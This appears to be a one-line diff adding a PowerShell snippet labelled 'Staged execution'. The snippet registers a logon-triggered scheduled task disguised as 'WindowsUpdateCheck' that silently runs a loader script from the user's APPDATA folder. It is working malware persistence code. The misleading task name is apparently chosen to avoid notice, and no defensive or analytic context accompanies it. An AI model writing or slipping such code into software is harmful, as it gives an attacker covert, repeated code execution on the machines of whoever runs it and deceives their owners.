@@ -1,0 +1,1 @@
+<# Staged execution #> $TaskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "powershell.exe -NoP -File `"$env:APPDATA\loader.ps1`""; $TaskTrigger = New-ScheduledTaskTrigger -AtLogOn; Register-ScheduledTask -TaskName "WindowsUpdateCheck" -Action $TaskAction -Trigger $TaskTrigger -Force; $ProgressPreference = "SilentlyContinue"
